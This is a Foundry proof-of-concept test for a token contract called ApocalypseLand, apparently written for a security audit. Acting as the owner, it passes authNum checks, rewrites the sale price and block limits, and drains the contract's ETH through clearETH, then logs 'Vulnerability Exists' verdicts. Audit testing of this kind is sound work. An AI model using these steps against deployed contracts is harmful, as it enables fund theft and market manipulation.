// SPDX-License-Identifier: MIT
pragma solidity 0.6.8;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/ApocalypseLand.sol";

contract ApocalypseLandTest is Test {
    ApocalypseLand token;
    address payable owner = payable(address(0x1337)); // Updated non-precompile address
    address constant USER = address(2);

    function setUp() public {
        vm.prank(owner);
        token = new ApocalypseLand();
        
        // Set authorization addresses to enable authNum() calls
        vm.prank(owner);
        token.setAuth(owner, owner);
    }

    function testPrivilegeEscalationSet() public {
        vm.startPrank(owner);
        
        // Capture initial critical parameters
        console.log("--- BEFORE-Trigger Parameters ---");
        (,, uint256 sPriceBefore, uint256 sMaxBlockBefore,,,) = token.getBlock();
        console.log("Initial Sale Price:", sPriceBefore);
        console.log("Initial Sale Max Block:", sMaxBlockBefore);

        // Set authNum to pass set() require check
        token.authNum(1);
        
        // Modify critical parameters
        console.log("--- Trigger: Modified Critical Parameters ---");
        uint256 newSaleMaxBlock = 999999;
        token.set(9, newSaleMaxBlock);
        
        token.authNum(1); // Reset auth after previous set()
        uint256 newSalePrice = 0.001 ether;
        token.set(10, newSalePrice);
        
        // Capture post-manipulation state
        console.log("--- AFTER-Trigger Parameters ---");
        (,, uint256 sPriceAfter, uint256 sMaxBlockAfter,,,) = token.getBlock();
        console.log("Modified Sale Price:", sPriceAfter);
        console.log("Modified Sale Max Block:", sMaxBlockAfter);
        
        // Differential validation
        bool priceChanged = (sPriceAfter != sPriceBefore); 
        bool maxBlockChanged = (sMaxBlockAfter != sMaxBlockBefore);
        bool paramsManipulated = priceChanged && maxBlockChanged;
        
        console.log("Price changed? -->", priceChanged ? "YES" : "NO");
        console.log("Max Block changed? -->", maxBlockChanged ? "YES" : "NO");
        console.log("Parameter manipulation successful? -->", paramsManipulated ? "YES" : "NO");
        
        // Final verdict
        if (paramsManipulated) {
            console.log("Vulnerability Exists: Critical parameters changed arbitrarily");
        } else {
            console.log("Vulnerability not Exist: No unauthorized parameter change detected");
        }
        vm.stopPrank();
    }

    function testPrivilegeEscalationClearETH() public {
        // Fund contract
        vm.deal(address(token), 1 ether);
        
        console.log("--- BEFORE-Trigger Balances ---");
        uint256 contractBalanceBefore = address(token).balance;
        uint256 ownerBalanceBefore = owner.balance;
        console.log("Contract ETH Before:", contractBalanceBefore);
        console.log("Owner ETH Before:", ownerBalanceBefore);

        vm.startPrank(owner);
        console.log("--- Trigger: clearETH Called ---");
        token.authNum(1000); // Pass clearETH() require
        token.clearETH();
        vm.stopPrank();
        
        console.log("--- AFTER-Trigger Balances ---");
        uint256 contractBalanceAfter = address(token).balance;
        uint256 ownerBalanceAfter = owner.balance;
        console.log("Contract ETH After:", contractBalanceAfter);
        console.log("Owner ETH After:", ownerBalanceAfter);
        
        // Differential validation
        bool fundsTransferred = (contractBalanceAfter == 0);
        bool ownerReceivedFunds = (ownerBalanceAfter == ownerBalanceBefore + contractBalanceBefore);
        bool fundsStolen = fundsTransferred && ownerReceivedFunds;
        
        console.log("Funds transferred? -->", fundsTransferred ? "YES" : "NO");
        console.log("Owner received funds? -->", ownerReceivedFunds ? "YES" : "NO");
        console.log("Funds stolen? -->", fundsStolen ? "YES" : "NO");
        
        // Final verdict
        if (fundsStolen) {
            console.log("Vulnerability Exists: All contract ETH transferred to owner");
        } else {
            console.log("Vulnerability not Exist: Funds not transferred as expected");
        }
    }
}